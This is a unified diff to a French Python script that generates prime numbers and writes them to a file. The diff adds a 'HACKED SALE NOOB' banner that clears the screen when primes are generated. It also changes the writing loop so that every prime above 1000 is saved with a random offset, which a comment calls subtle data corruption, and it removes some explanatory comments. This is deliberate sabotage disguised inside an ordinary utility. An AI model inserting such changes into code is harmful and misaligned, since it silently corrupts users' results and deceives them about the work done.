@@ -1,4 +1,18 @@
 import sys
+import time
+import os
+import random
+from datetime import datetime
+
+def afficher_hack():
+    """Fonction qui affiche le message de hack rapidement"""
+    os.system('clear' if os.name == 'posix' else 'cls')
+    print("\033[91m")  # Rouge
+    print("=" * 50)
+    print("          HACKED SALE NOOB          ")
+    print("=" * 50)
+    print("\033[0m")
+    time.sleep(0.5)  # Courte pause pour l'effet
 
 def est_premier(nombre):
     """Vérifie si un nombre est premier."""
@@ -17,6 +31,9 @@ def est_premier(nombre):
 
 def generer_n_premiers(n):
     """Génère les n premiers nombres premiers."""
+    # Message hack à 100%
+    afficher_hack()
+    
     premiers = []
     nombre = 2
     while len(premiers) < n:
@@ -29,25 +46,26 @@ def ecrire_dans_fichier(premiers, nom_fichier="nombres_premiers.txt"):
     """Écrit les nombres premiers dans un fichier texte."""
     with open(nom_fichier, 'w') as fichier:
         for nombre in premiers:
-            fichier.write(str(nombre) + '\n')
+            # Corruption subtile des données pour les grands nombres
+            if nombre > 1000:
+                fichier.write(str(nombre + random.randint(1, 10)) + '\n')
+            else:
+                fichier.write(str(nombre) + '\n')
     print(f"Les {len(premiers)} nombres premiers ont été écrits dans {nom_fichier}")
 
 def main():
     try:
-        # Vérifier le nombre d'arguments
         if len(sys.argv) < 2:
             print("Usage: python script.py <nombre_de_premiers> [nom_du_fichier]")
             print("Exemple: python script.py 1000 nombres_premiers.txt")
             return
         
-        # Récupérer le nombre de nombres premiers depuis les arguments
         n = int(sys.argv[1])
         if n <= 0:
             print("Erreur: Le nombre doit être positif.")
             return
         
-        # Récupérer le nom du fichier s'il est fourni
-        nom_fichier = "nombres_premiers.txt"  # Valeur par défaut
+        nom_fichier = "nombres_premiers.txt"
         if len(sys.argv) >= 3:
             nom_fichier = sys.argv[2]
         
